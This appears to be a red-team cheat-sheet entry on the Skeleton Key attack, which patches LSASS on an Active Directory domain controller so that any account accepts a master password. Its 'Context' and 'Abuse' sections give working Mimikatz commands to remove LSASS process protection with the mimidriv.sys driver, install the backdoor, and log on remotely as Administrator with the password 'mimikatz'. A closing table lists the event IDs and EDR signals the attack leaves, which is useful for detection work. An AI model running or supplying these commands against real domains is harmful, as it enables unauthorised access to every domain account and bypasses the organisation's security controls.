
```text
Memory patch inside LSASS on the Domain Controller
↓
Allows authentication as any user with a master password
↓
Memory-only effect, no disk persistence by default
```

Skeleton Key injects a backdoor into the DC's LSASS process that:

- intercepts domain authentications
- accepts a master password (default: `mimikatz`)
- allows logon as any valid user

> real user + password `mimikatz` -> valid access

- It only works on the Domain Controller.
- It only affects domain authentication.
- It is not persistent and disappears after a DC reboot.

- [ ] Context

If LSASS is running as a protected process, Skeleton Key can still be used, but you will need the Mimikatz driver (`mimidriv.sys`) on disk on the target DC.

```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

- [ ] Abuse

```powershell
# Execution
.\mimikatz.exe "privilege::debug" "misc::skeleton" -ComputerName dc01.domain.local

# Usage
Enter-PSSession -ComputerName dc01.domain.local -Credential user\Administrator
# password: mimikatz
```

- [ ] OPSEC

| Category | What you see | Log source | Events / Indicators |
| --- | --- | --- | --- |
| Mimikatz / loader execution | Unusual process on the DC (`mimikatz.exe`, PowerShell launcher, `rundll32`, etc.) | Security + Sysmon | 4688 / Sysmon 1 |
| LSASS access (dump/patch) | A process opens a handle to `lsass.exe` | Sysmon | Sysmon 10 with high-access rights (`0x1fffff`, etc.) |
| Credential extraction / `sekurlsa` style behavior | Memory-read activity against LSASS | Defender for Endpoint / EDR | Credential dumping / LSASS access alerts |
| Injection / memory patching | LSASS memory modification | EDR / Sysmon | Sometimes Sysmon 8 / code injection alerts |
| High privileges | Privileges such as `SeDebugPrivilege` become active | Security | 4672 |
| Suspicious logons to the DC | New admin/remote sessions on the DC | Security | 4624 Type 3/10 correlated with new source machine/user |
| WMI / PSRemoting used to launch | Remote execution toward the DC | Security / PowerShell | 4624 + 4688, optionally 4104 |
| PPL bypass / driver load | `mimidriv.sys` or another driver gets loaded | System + Sysmon | 7045 / Sysmon 6 |
| LSASS protection tampering | Attempts to disable PPL or alter LSASS protection | EDR | Direct tamper detections |
| “Magic” authentication | Multiple accounts succeed with an incorrect but shared master password | DC Security + SIEM | 4624 patterns without expected failures, many accounts from one source |
| Kerberos / NTLM anomalies | Odd tickets or logons after the backdoor is installed | Security | 4768 / 4769 / 4771 / 4776 |
| Volatile persistence | The effect disappears after reboot | Operational observation | “It vanished after reboot” |
